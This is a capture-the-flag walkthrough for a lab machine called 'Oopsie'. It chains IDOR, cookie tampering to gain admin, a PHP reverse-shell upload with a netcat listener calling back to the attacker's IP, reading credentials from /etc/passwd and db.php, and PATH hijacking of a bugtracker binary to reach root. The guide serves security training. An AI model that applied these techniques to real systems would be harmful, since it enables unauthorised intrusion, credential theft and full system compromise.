# Oopsie

This machine introduces IDOR vulnerabilities, cookie manipulation, file upload abuse, and privilege escalation through PATH hijacking.

## Find open ports and services running on the target IP

Perform a service scan to identify open ports and running services.

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

Expected result:

* Port 80: HTTP

## Locate the login page

Directory brute-forcing with Gobuster is possible but can be time-consuming.

Instead, inspect the page source using Developer Tools and look through the loaded scripts.

A script references the following directory:

```text
/cdn-cgi/login/
```

Navigate to the login page and authenticate using the guest account.

## Obtain the administrator user ID

After logging in as a guest, navigate to the **Accounts** page.

The URL contains an `id` parameter corresponding to the current user:

```text
/account.php?id=2
```

Since the guest account has ID `2`, try changing the value to:

```text
/account.php?id=1
```

This reveals information belonging to the administrator account, confirming an Insecure Direct Object Reference (IDOR) vulnerability.

Record the administrator's user ID.

## Gain access to the Upload functionality

Navigate to the **Uploads** page.

The page indicates that only administrator users can upload files.

Open Developer Tools and inspect the browser cookies.

Two relevant cookies can be found:

```text
role
user
```

Modify the values:

```text
role=admin
user=<administrator_id>
```

Refresh the page.

The upload functionality is now available.

## Enumerate directories

Use Gobuster to identify additional directories.

Command:

```bash
gobuster dir -u http://<target_ip>/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
```

An `uploads` directory is discovered:

```text
/uploads
```

This is likely where uploaded files are stored.

## Upload a PHP reverse shell

### Prepare the shell

Copy the default PHP reverse shell to the current directory:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./

nano php-reverse-shell.php
```

Update the following values:

* Attacker VPN IP
* Listening port

Save the file.

### Start a Netcat listener

Open a new terminal and start a listener on the configured port.

Command:

```bash
nc -nvlp <shell_port>
```

### Upload and execute the shell

Upload the PHP reverse shell through the Upload functionality.

Navigate to the uploaded file within the `/uploads` directory to execute it.

A reverse shell connection should be received on the Netcat listener.

## Upgrade the shell

Spawn a fully interactive TTY shell.

Command:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Enumerate system users

View the local user accounts.

Command:

```bash
cat /etc/passwd
```

A user named `robert` can be identified.

Navigate to the user's home directory:

```bash
cd /home/robert

ls
```

Retrieve the user flag:

```bash
cat user.txt
```

## Obtain Robert's password

Navigate to the login application's source directory:

```bash
cd /var/www/html/cdn-cgi/login

ls
```

Inspect the database configuration file:

```bash
cat db.php
```

Database credentials are stored within the file.

The password for user `robert` can be recovered here.

## Switch to the Robert account

Use the discovered password to authenticate as Robert.

Command:

```bash
su robert
```

Enter the recovered password when prompted.

## Privilege escalation

Check for sudo privileges:

```bash
sudo -l
```

Robert does not have permission to use sudo.

Alternative privilege escalation methods must be explored.

## Enumerate Robert's group memberships

Display account and group information.

Command:

```bash
id
```

The output shows that Robert belongs to the `bugtracker` group.

Search for files owned by this group.

Commands:

```bash
locate bugtracker
```

or

```bash
find / -group bugtracker 2>/dev/null
```

A binary is discovered:

```text
/usr/bin/bugtracker
```

Inspect the file:

```bash
ls -la /usr/bin/bugtracker

file /usr/bin/bugtracker
```

## Analyze the bugtracker binary

Execute the binary:

```bash
/usr/bin/bugtracker
```

The program prompts for a bug ID.

Supplying arbitrary input generates an error message indicating that the binary uses the `cat` command to read files from:

```text
/root/reports
```

At this point, the important observation is that the error references the command `cat` itself rather than an absolute path such as:

```text
/bin/cat
```

This suggests that the program may be calling `cat` without specifying its full path. When a program executes a command in this way, the operating system searches for the executable in the directories listed in the `PATH` environment variable.

If we can place our own executable named `cat` in a directory that appears earlier in `PATH`, the program may execute our malicious version instead of the legitimate system binary.

## Exploit PATH hijacking

Create a writable working directory:

```bash
cd /tmp
```

Create a fake `cat` executable that launches a shell:

```bash
echo "/bin/sh" > cat

chmod +x cat
```

Modify the `PATH` variable so that `/tmp` is searched before the standard system directories:

```bash
export PATH=/tmp:$PATH
```

Verify the operating system will now resolve `cat` to our malicious executable:

```bash
which cat
```

Expected output:

```text
/tmp/cat
```

Now execute the vulnerable binary again:

```bash
bugtracker
```

When the program attempts to run `cat`, it finds and executes our malicious version first, spawning a root shell.

This technique is known as **PATH hijacking**, where an attacker abuses a program that invokes system commands without using absolute paths.


## Retrieve the root flag

Verify privileges:

```bash
whoami
```

Expected output:

```text
root
```

Navigate to the root directory:

```bash
cd /root

ls
```

Read the root flag:

```bash
cat root.txt
```

The root flag is successfully obtained.

## Key Takeaway

This machine demonstrates how multiple low-severity vulnerabilities can be chained together:

1. IDOR reveals administrator information.
2. Cookie manipulation grants administrative functionality.
3. File upload leads to remote code execution.
4. Stored credentials allow lateral movement.
5. PATH hijacking results in privilege escalation to root.
